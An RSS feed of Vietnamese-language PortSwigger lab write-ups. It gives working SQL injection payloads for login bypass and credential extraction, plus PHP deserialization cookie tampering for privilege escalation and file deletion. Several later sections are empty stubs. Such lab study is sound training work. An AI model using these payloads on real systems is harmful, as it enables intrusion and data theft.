@@ -1,0 +1,597 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>PortSwigger - Category - g03m0n</title>
+        <link>https://g03m0n.github.io/categories/portswigger/</link>
+        <description>PortSwigger - Category - g03m0n</description>
+        <generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</lastBuildDate><atom:link href="https://g03m0n.github.io/categories/portswigger/" rel="self" type="application/rss+xml" /><item>
+    <title>PortSwigger - SQL Injection</title>
+    <link>https://g03m0n.github.io/posts/portswigger---sqli/portswigger---sqli/</link>
+    <pubDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/portswigger---sqli/portswigger---sqli/</guid>
+    <description><![CDATA[<h2 id="1-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: APPRENTICE</p>
+<h3 id="description">Description</h3>
+<p>Lab này chứa lỗ hổng SQLi trong bộ lọc danh mục sản phẩm. Khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Gifts&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Để giải quyết bài lab, khiến ứng dụng hiển thị một hoặc nhiều sản phẩm chưa được phát hành.</p>
+<h3 id="step">Step</h3>
+<p>Đầu tiên click vào một category bất kỳ
+Sau khi nhấp vào <code>Accessories</code> category, URL hiển thị:</p>
+<pre tabindex="0"><code>https://0a8000e303dd05e481ca2ff0002600bb.web-security-academy.net/filter?category=Accessories
+</code></pre><p>Để ý những từ in đậm là chuỗi truy vấn.
+Ứng dụng sẽ thực hiện một truy vấn SQL để lấy thông tin từ cơ sở dữ liệu.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Mục tiêu là lấy tất cả thông tin sản phẩm, từ tất cả danh mục và cả sản phẩm đã phát hành và chưa phát hành.
+Câu lệnh trên hiển thị <code>released = 1</code> nghĩa là nó sẽ chỉ hiển thị các sản phẩm đã được phát hành, trong đó <code>released = 0</code> đại diện cho các sản phẩm chưa được phát hành.</p>
+<p></p>
+<p>Tiếp theo nếu thêm một dấu <code>'</code> vào cuối chuỗi truy vấn</p>
+<p><code>?category=Accessories'</code></p>
+<p>Câu truy vấn sẽ là</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Điều này sẽ gây ra lỗi vì có một dấu <code>'</code> chưa được đóng.</p>
+<p></p>
+<p>Tiếp theo, thêm 2 dấu gạch ngang:</p>
+<p><code>?category=Accessories' --</code></p>
+<p>Câu truy vấn sẽ là</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Trong MySQL, mọi thứ sau dấu <code>--</code> sẽ được coi là <code>comment</code>.
+Có nghĩa là bây giờ trang web sẽ hiển thị tất cả các sản phẩm thuộc danh mục <code>Accessories</code>, cả <code>released</code> và <code>unreleased</code>.</p>
+<p></p>
+<p>Để hiển thị đầy đủ mọi thứ trong cơ sở dữ liệu:</p>
+<p><code>?category=Acesssories' or '1'='1' --'</code></p>
+<p>Chuỗi truy vấn lúc này sẽ là:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Với truy vấn trên, nó sẽ trả về tất cả các sản phẩm khi <code>Category</code> là <code>Accessories</code> hoặc <code>1 = 1</code> , vì <code>1 = 1</code> luôn đúng nên nó sẽ trả về tất cả các sản phẩm.</p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="2-sql-injection-vulnerability-allowing-login-bypass">2. SQL injection vulnerability allowing login bypass</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: APPRENTICE</p>
+<h3 id="description-1">Description</h3>
+<p>Lab này chứa lỗ hổng SQL Injection trong chức năng đăng nhập.</p>
+<p>Để giải quyết bài lab, thực hiện một cuộc tấn công SQLi để đăng nhập vào ứng dụng với tư cách là <code>administrator</code>.</p>
+<h3 id="step-1">Step</h3>
+<p>Đầu tiên ấn vào <code>My account</code> để vào giao diện <code>login</code>
+Thử đăng nhập với tài khoản <code>administrator</code> và mật khẩu bất kỳ.</p>
+<p></p>
+<p>Khi đăng nhập, câu truy vấn sẽ có dạng:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">users</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;administrator&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;password&#39;</span>
+</span></span></code></pre></div><p>Tiếp theo ta thử thêm 1 dấu <code>'</code> vào cuối <code>administrator</code> và đăng nhập.</p>
+<p></p>
+<p>Server sẽ bị lỗi, điều này cho thấy server bị lỗi SQL Injection.
+Nếu ta tiêm vào <code>username</code> câu lệnh: <code>administrator' or '1' = '1' --</code>
+Câu truy vấn sẽ có dạng:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">users</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;administrator&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">--</span><span style="color:#e6db74">&#39; AND password = &#39;</span><span style="color:#a6e22e">password</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p>Bất kể mật khảu của tài khoản <code>administrator</code> có đúng hay không, vì <code>1 = 1</code> sẽ luôn trả về <code>true</code> và dấu <code>--</code> sẽ <code>comment</code> phần còn lại của câu lệnh <code>' AND password = 'password'</code> nên nó sẽ đăng nhập vào tài khoản <code>administrator</code>.</p>
+<p></p>
+<p>Đăng nhập thành công.
+Solved</p>
+<p></p>
+<h2 id="3-sql-injection-attack-querying-the-database-type-and-version-on-oracle">3. SQL injection attack, querying the database type and version on Oracle</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-2">Description</h3>
+<p>Lab này chứa lỗ hổng SQL Injection trong filter danh mục sản phẩm. Sử dụng UNION Attack để truy xuất kết quả từ truy vấn được chèn.
+Để giải bài lab, hãy hiển thị phiên bản của cơ sở dữ liệu.</p>
+<h3 id="step-2">Step</h3>
+<p>Trong Oracle, built-in table có tên là <code>dual</code>, do vậy, ta có thể dò cột bằng cách sử dụng <code>UNION SELECT</code> và gọi <code>FROM</code> đến bảng <code>dual</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> <span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">null</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">dual</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p>Lặp đi lặp lại câu lệnh, mỗi lần tăng số lượng <code>null</code>.
+Ta có thể tìm thấy số lượng cột chính xác bằng cách thêm <code>' UNION (select null, null)--</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">someTable</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> (<span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>) <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">dual</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p></p>
+<p>Đến đây, ta có thể biết được <code>version</code> của database bằng payload: <code>' UNION SELECT NULL,banner FROM v$version --'</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> <span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">NULL</span>,<span style="color:#a6e22e">banner</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">v</span>$version <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="4-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">4. SQL injection attack, querying the database type and version on MySQL and Microsoft</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-3">Description</h3>
+<p>Lab này chứa lỗ hổng SQL Injection trong filter danh mục sản phẩm. Sử dụng UNION Attack để truy xuất kết quả từ truy vấn được chèn.
+Để giải bài lab, hãy hiển thị phiên bản của cơ sở dữ liệu.</p>
+<h3 id="step-3">Step</h3>
+<p>Lab này tương tự như lab về <a href="#3-sql-injection-attack-querying-the-database-type-and-version-on-oracle" rel="">Oracle Datable</a>
+ nhưng sử dụng MySQL Database.
+Đầu tiên ta cũng dự đoán số cột tương tự <a href="#step-2" rel="">lab 3</a>
+ .
+Database lần này cũng gồm 2 cột sau khi thử: <code>Accessories' UNION SELECT NULL,NULL --'</code></p>
+<p></p>
+<p>Đến đây, ta có thể biết được <code>version</code> của database bằng payload: <code>' UNION SELECT NULL,@@version --'</code></p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases">5. SQL injection attack, listing the database contents on non-Oracle databases</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-4">Description</h3>
+<p>Lab này yêu cầu ta tìm kiếm account của administrator để login. Tuy vậy, ta chưa biết database loại nào mà chỉ biết nó không phải là Oracle mà thôi.</p>
+<h3 id="step-4">Step</h3>
+<p>Đầu tiên, ta sẽ dò số cột trong database:</p>
+<p></p>
+<p>Như vậy ta đã biết trong database có 2 cột.
+Thử một số cách kiểm tra <code>version</code> của database ta có thể biết được server dụng <code>PostgreSQL</code>.</p>
+<p>
+</p>
+<p>Ta sử dụng payload này để kiểm tra tên bảng có trong database: <code>' UNION SELECT NULL, table_name FROM information_schema.tables --'</code></p>
+<p></p>
+<p>Có 2 bảng là <code>pg_user</code> và <code>users_excods</code>
+Kiểm tra lần lượt các cột trong 2 bảng này thì phát hiện ra trong bảng <code>user_excods</code> có 2 cột khả nghi.</p>
+<p>Payload: <code>' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users_excods' --'</code></p>
+<p></p>
+<p>Kiểm tra 2 cột, ta biết được tài khoản/mật khẩu của <code>administrator</code>.</p>
+<p>Payload: <code>' UNION SELECT username_tjzvcx, password_ligkez FROM users_excods --'</code></p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="6-sql-injection-attack-listing-the-database-contents-on-oracle">6. SQL injection attack, listing the database contents on Oracle</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-5">Description</h3>
+<p>Lab này yêu cầu ta tìm kiếm account của administrator để login. Sử dụng Oracle Database.</p>
+<h3 id="step-5">Step</h3>
+<p>Giống với <a href="#5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases" rel="">lab 5</a>
+ ở trên nên mình sẽ làm tương tự.</p>
+<p>Payload: <code>' UNION SELECT NULL, table_name from all_tables --'</code></p>
+<p></p>
+<p></p>
+<p>Tìm được bảng có tên <code>USERS_JBIWMO</code>.
+Tiếp tục tìm kiếm các cột có trong bảng <code>USERS_JBIWMO</code></p>
+<p></p>
+<p>Ta tìm được tài khoản/mật khẩu của <code>administrator</code> với payload:</p>
+<p>Payload: <code>' UNION SELECT USERNAME_EYKUIK, PASSWORD_ISAXTU FROM USERS_JBIWMO --'</code>
+</p>
+<p>Solved</p>
+<p></p>
+<h2 id="7-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">7. SQL injection UNION attack, determining the number of columns returned by the query</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-6">Description</h3>
+<p>Bài lab yêu cầu ta xác định số cột của bảng bằng cách sử dụng SQL injection UNION attack.</p>
+<h3 id="step-6">Step</h3>
+<p>Tương tự cách xác định cột tại <a href="#step-3" rel="">đây</a>
+.</p>
+<p>Payload: <code>' UNION SELECT NULL, NULL, NULL --'</code></p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="8-sql-injection-union-attack-finding-a-column-containing-text">8. SQL injection UNION attack, finding a column containing text</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-7">Description</h3>
+<p>Bài lab yêu cầu ta tìm chuỗi dữ liệu cho trước <code>64fl9W</code> bằng cách sử dụng SQL injection UNION attack.</p>
+<h3 id="step-7">Step</h3>
+<p>Đầu tiên ta cũng <a href="#step-3" rel="">xác định số cột của bảng</a>
+.</p>
+<p>Payload: <code>' UNION SELECT NULL, NULL, NULL --'</code></p>
+<p></p>
+<p>Với UNION Attack, ta có thể tìm một cột chưa giá trị loại <code>string</code> bằng cách thử chèn đoạn <code>string</code> cần tìm vào:</p>
+<p>Payload: <code>' UNION SELECT NULL, '64fl9W' ,NULL --'</code></p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="9-sql-injection-union-attack-retrieving-data-from-other-tables">9. SQL injection UNION attack, retrieving data from other tables</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-8">Description</h3>
+<h3 id="step-8">Step</h3>
+<h2 id="10-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">10. SQL injection UNION attack, retrieving multiple values in a single column</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: APPRENTICE</p>
+<h3 id="description-9">Description</h3>
+<h3 id="step-9">Step</h3>
+<h2 id="11-blind-sql-injection-with-conditional-responses">11. Blind SQL injection with conditional responses</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-10">Description</h3>
+<h3 id="step-10">Step</h3>
+<h2 id="12-blind-sql-injection-with-conditional-errors">12. Blind SQL injection with conditional errors</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-11">Description</h3>
+<h3 id="step-11">Step</h3>
+<h2 id="13">13.</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-12">Description</h3>
+<h3 id="step-12">Step</h3>
+]]></description>
+</item>
+<item>
+    <title>PortSwigger - Insecure Deserialization</title>
+    <link>https://g03m0n.github.io/posts/portswigger---insecure-deserialization/portswigger-insecure-deserialization/</link>
+    <pubDate>Wed, 20 Dec 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/portswigger---insecure-deserialization/portswigger-insecure-deserialization/</guid>
+    <description><![CDATA[<blockquote>
+<p>Thông thường cấu trúc của <code>Serialize Data</code> có dạng:
+<code>O: strlen(object name): object name: object size: {... elements...}</code></p>
+</blockquote>
+<h2 id="1--modifying-serialized-objects">1.  Modifying serialized objects</h2>
+<h3 id="description">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos&rsquo;s account.
+You can log in to your own account using the5 following credentials: wiener:peter</p>
+</blockquote>
+<h3 id="exploitaion">Exploitaion</h3>
+<p>Challenge này yêu cầu ta thay đổi thuộc tính trên serialized objects để leo quyền lên admin.</p>
+<p>Đăng nhập bằng tài khoản <code>wiener:peter</code>.</p>
+<p></p>
+<p>Ta thấy <code>session cookie</code> là một object <code>User</code> sau khi được serialized và base64-encode. Để ý object <code>User</code> này có thuộc tính <code>admin</code> hiện có giá trị boolean <code>0</code> tức là <code>false</code>.</p>
+<p></p>
+<p>Vì user này không phải <code>admin</code> → không vào được trang <code>/admin</code>.
+=&gt; Ta thử thay đổi giá trị boolean ở serialized session cookie thành <code>1</code></p>
+<p></p>
+<p>End-code base64</p>
+<p></p>
+<p>Edit cookie của trang web và load lại trang:</p>
+<p></p>
+<p>=&gt; <code>User</code> đã đăng nhập được vào trang <code>/admin</code>
+Tiến hành xóa user <code>Carlos</code>.</p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="2-modifying-serialized-data-types">2. Modifying serialized data types</h2>
+<h3 id="description-1">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete Carlos.
+You can log in to your own account using the following credentials: wiener:peter</p>
+</blockquote>
+<h3 id="exploitaion-1">Exploitaion</h3>
+<p>Tương tự lab 1, session cookie cũng được serialize từ <code>User</code> object</p>
+<p></p>
+<p>Lần này ứng dụng authenticate user thông qua thuộc tính access_token là chuỗi kí tự dài 32 kí tự.</p>
+<pre tabindex="0"><code>O: 4: &#34;User&#34;: 2: {s: 8: &#34;username&#34;; s: 6: &#34;wiener&#34;; s: 12: &#34;access_token&#34;;s: 32: &#34;t2blplwd06k5lr3coyxnjzy7ne355ge5&#34;;}
+</code></pre><p>Tuy nhiên, theo mô tả có thể ứng dụng này sử dụng PHP loose comparison bởi operator <code>==</code> để authenticate như sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$user <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($_SESSION)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($user[<span style="color:#e6db74">&#39;access_token&#39;</span>] <span style="color:#f92672">==</span> $access_token) {
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Authenticate successfully
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
+</span></span></code></pre></div><p>Như vậy ta sẽ bypass bằng cách chỉnh <code>access_token</code> về số nguyên 0 → bypass được <code>==</code> vì 0 <code>==</code> <code>string</code> sẽ trả về <code>true</code>. Serialized object sau khi chỉnh như sau:</p>
+<pre tabindex="0"><code>O: 4: &#34;User&#34;: 2: {s: 8: &#34;username&#34;; s: 6: &#34;wiener&#34;; s: 12: &#34;access_token&#34;;i: 0;}
+</code></pre><p>Endcode base64 và edit cookie</p>
+<p></p>
+<p>Đăng nhập vào <code>admin</code> panel thành công và tiến hành xóa user <code>Carlos</code>.</p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="3-using-application-functionality-to-exploit-insecure-deserialization">3. Using application functionality to exploit insecure deserialization</h2>
+<h3 id="description-2">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos&rsquo;s home directory.
+You can log in to your own account using the following credentials: wiener:peter
+You also have access to a backup account: gregg:rosebud</p>
+</blockquote>
+<h3 id="exploitaion-2">Exploitaion</h3>
+<p>Tương tự 2 labs trên, Session Cookie cũng được serialize từ <code>User</code> object</p>
+<p></p>
+<p>Lần này ứng dụng có thêm thuộc tính <code>avatar_link</code>. Mà ứng dụng này có chức năng <code>Delete account</code> =&gt; Khi ấn vào nút <code>Delete account</code> thì ứng dụng sẽ xóa cả <code>avatar</code> của người dùng.</p>
+<p>Nếu ta thay đổi đường dẫn tại thuộc tính <code>avatar_link</code> thành 1 file bất kì trong hệ thống thì file đó sẽ bị delete khỏi hệ thống khi <code>Delete account</code>.</p>
+<p>Chỉnh sửa <code>avatar_link</code> thành <code>/home/carlos/morale.txt</code> để tiến hành xóa file.</p>
+<pre tabindex="0"><code>O:4:&#34;User&#34;:3:{s:8:&#34;username&#34;;s:6:&#34;wiener&#34;;s:12:&#34;access_token&#34;;s:32:&#34;bqp5e5wpdhhaz3rt0knb1u6uowozl5se&#34;;s:11:&#34;avatar_link&#34;;s:23:&#34;/home/carlos/morale.txt&#34;;}
+</code></pre><p>Endcode base64 và Edit cookie.</p>
+<p></p>
+<p></p>
+<p>Load lại trang và Solved.</p>
+<p></p>
+<h2 id="4-arbitrary-object-injection-in-php">4. Arbitrary object injection in PHP</h2>
+<h3 id="description-3">Description</h3>
+<blockquote>
+<p>This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the morale.txt file from Carlos&rsquo;s home directory. You will need to obtain source code access to solve this lab.
+You can log in to your own account using the following credentials: wiener:peter</p>
+</blockquote>
+<h3 id="exploitaion-3">Exploitaion</h3>
+<p>Tương tự 3 labs trên, Session Cookie cũng được serialize từ <code>User</code> object</p>
+<p>Khi ấn vào <code>view-source</code> ta thấy một đường dẫn:</p>
+<p></p>
+<p>Kiểm tra thử đường dẫn xem có đọc được source code không:</p>
+<p></p>
+<p>Không có gì phản hồi. Ta thử thêm dấu <code>~</code> vào cuối đường dẫn, ta xem được mã nguồn file <code>/libs/CustomTemplate.php</code>.</p>
+<p>Mã nguồn file <code>/libs/CustomTemplate.php</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CustomTemplate</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $template_file_path;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> $lock_file_path;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($template_file_path) {
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">template_file_path</span> <span style="color:#f92672">=</span> $template_file_path;
+</span></span><span style="display:flex;"><span>        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span> <span style="color:#f92672">=</span> $template_file_path <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;.lock&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isTemplateLocked</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">file_exists</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">lock_file_path</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getTemplate</span>() {
